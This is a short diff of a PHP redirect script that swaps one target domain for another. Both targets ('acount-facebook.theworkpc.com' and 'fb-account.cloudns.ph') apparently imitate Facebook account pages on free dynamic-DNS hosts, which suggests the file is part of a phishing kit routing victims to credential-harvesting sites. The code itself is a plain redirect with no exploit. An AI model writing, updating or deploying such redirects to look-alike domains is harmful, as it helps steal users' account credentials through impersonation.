@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://acount-facebook.theworkpc.com/"); 
+header("Location: https://fb-account.cloudns.ph/"); 
   
 exit; 
 ?> 
